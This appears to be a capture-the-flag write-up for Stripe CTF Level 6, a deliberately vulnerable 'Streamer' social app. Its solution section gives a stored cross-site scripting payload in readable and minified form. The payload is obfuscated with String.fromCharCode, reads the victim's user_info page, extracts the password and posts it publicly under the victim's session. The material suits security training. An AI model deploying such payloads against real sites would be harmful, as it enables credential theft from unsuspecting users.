## Level 6

After Karma Trader from Level 4 was hit with massive karma inflation (purportedly due to someone flooding the market with massive quantities of karma), the site had to close its doors. All hope was not lost, however, since the technology was acquired by a real up-and-comer, Streamer. Streamer is the self-proclaimed most steamlined way of sharing updates with your friends. You can access your Streamer instance here: https://level06-1.stripe-ctf.com/user-xxxxxxxxxx.

The Streamer engineers, realizing that security holes had led to the demise of Karma Trader, have greatly beefed up the security of their application. Which is really too bad, because you've learned that the holder of the password to access Level 7, level07-password-holder, is the first Streamer user.

As well, level07-password-holder is taking a lot of precautions: his or her computer has no network access besides the Streamer server itself, and his or her password is a complicated mess, including quotes and apostrophes and the like.

Fortunately for you, the Streamer engineers have decided to open-source their application so that other people can run their own Streamer instances. You can obtain the source for Streamer at `git clone https://level06-1.stripe-ctf.com/user-xxxxxxxxxx/level06-code`. We've also included the most important files below.

### Running

- Install bundler: 'gem install bundler'
- Run srv.rb: './srv.rb'
- Point your browser to localhost:4567

### Solution

  * Unminified Version:
  
  ```javascript
  }];
  </script>
  <script>
    a = document.URL + String.fromCharCode(117, 115, 101, 114, 95, 105, 110, 102, 111); // 'user_info'
    b = String.fromCharCode(35, 99, 111, 110, 116, 101, 110, 116);                      // '#content'
    c = String.fromCharCode(35, 110, 101, 119, 95, 112, 111, 115, 116);                 // '#new_post'
    $.get(a, function(data) {
      var re = /<td>(.*)</g;
      re.lastIndex = 0;
      while (match = re.exec(data)) {
        password = match[1];
      }
      if (password) {
        $(b).val(escape(password));
        $(c).submit();
      }
    });
  </script>
  <script>
  ```

  * Minified Version:
  
  ```javascript
  }];</script><script>a=document.URL+String.fromCharCode(117,115,101,114,95,105,110,102,111);b=String.fromCharCode(35,99,111,110,116,101,110,116);c=String.fromCharCode(35,110,101,119,95,112,111,115,116);$.get(a,function(data){var re=/<td>(.*)<\/td>/g;re.lastIndex=0;while(match=re.exec(data)){password=match[1]}if(password){$(b).val(escape(password));$(c).submit()}});</script><script>
  ```

Originally posted at [https://stripe-ctf.com/levels/6](https://stripe-ctf.com/levels/6).
